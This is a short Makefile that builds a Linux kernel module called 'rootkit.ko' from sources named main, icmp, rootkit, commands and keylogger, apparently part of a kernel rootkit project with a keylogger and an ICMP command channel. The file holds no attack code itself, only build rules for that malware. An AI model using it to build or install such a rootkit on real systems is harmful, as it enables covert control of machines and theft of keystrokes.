KERNELDIR:=/lib/modules/$(shell uname -r)/build
EXTRA_CFLAGS := -I$(src)/inc

obj-m = rootkit.o
rootkit-objs = src/main.o src/icmp.o src/rootkit.o src/commands.o src/keylogger.o

all: rootkit.ko

rootkit.ko: src/main.c src/icmp.c src/rootkit.c src/commands.c src/keylogger.c
	make -C $(KERNELDIR) M=$(PWD) modules

clean:
	make -C $(KERNELDIR) M=$(PWD) clean